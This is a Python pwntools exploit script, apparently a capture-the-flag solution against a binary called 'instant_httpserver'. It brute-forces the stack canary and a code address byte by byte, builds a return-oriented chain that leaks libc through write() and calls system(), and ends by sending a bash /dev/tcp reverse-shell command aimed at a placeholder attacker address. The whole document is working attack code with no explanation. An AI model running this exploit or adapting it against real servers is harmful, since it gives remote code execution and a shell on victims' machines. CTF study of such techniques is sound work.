#!/usr/bin/env python
from pwn import *

def connect():
    if len(sys.argv) == 1:
        return remote('localhost', 4445)
    else:
        return remote('114.177.250.4', 4445)

canary = '\0'
# canary = p64(0xd24d47ace02aab00)
while len(canary) < 8:
    for i in range(0x100):
        s = connect()
        s.send('A' * 0x208 + canary + chr(i))
        time.sleep(0.1)
        res = s.recv()
        s.close()
        if '<br />' in res:
            canary += chr(i)
            break
    log.info('canary: %#x' % u64(canary.ljust(8, '\0')))

text_addr = '\x94'
# text_addr = p64(0x56158a0f2c94)
while len(text_addr) < 8:
    for i in range(0x100):
        s = connect()
        payload = ''
        payload += 'A' * 0x208
        payload += canary
        payload += 'A' * 8
        payload += text_addr + chr(i)
        s.send(payload)
        s.recvuntil('Server: ')
        try:
            res = s.recvuntil('Server: ', timeout=0.1)
        except Exception:
            continue
        finally:
            s.close()
        if res is not None and 'Server: ' in res:
            text_addr += chr(i)
            break
    log.info('text address: %#x' % u64(text_addr.ljust(8, '\0')))
text_base = u64(text_addr) - 0xc94

elf = ELF('./instant_httpserver')
elf.address = text_base
libc = ELF('./libc.so.6')

pop_rdi = text_base + 0xe93
pop_rsi_r15 = text_base + 0xe91
leave = text_base + 0xcb2
ret = text_base + 0x8ae

s = connect()
payload = ''
payload += 'A' * 0x208
payload += canary
payload += p64(elf.bss(0x4f8))
payload += p64(pop_rdi) + p64(4)
payload += p64(pop_rsi_r15) + p64(elf.got['write']) + p64(0)
payload += p64(elf.symbols['write'])
payload += p64(pop_rsi_r15) + p64(elf.bss(0x500)) + p64(0)
payload += p64(elf.symbols['read'])
payload += p64(pop_rsi_r15) + p64(elf.bss(0x518)) + p64(0)
payload += p64(elf.symbols['read'])
payload += p64(leave)
s.send(payload)

s.recvuntil('Length is ')
s.recv(3)
libc_base = u64(s.recv(6).ljust(8, '\0')) - libc.symbols['write']
log.info('libc base: %#x' % libc_base)

payload = ''
payload += p64(pop_rdi) + p64(elf.bss(0x518))
payload += p64(libc_base + libc.symbols['system'])
s.send(payload)
s.send("bash -c 'sh < /dev/tcp/XXX.XXX.XXX.XXX/1234 >&0'")
s.interactive()
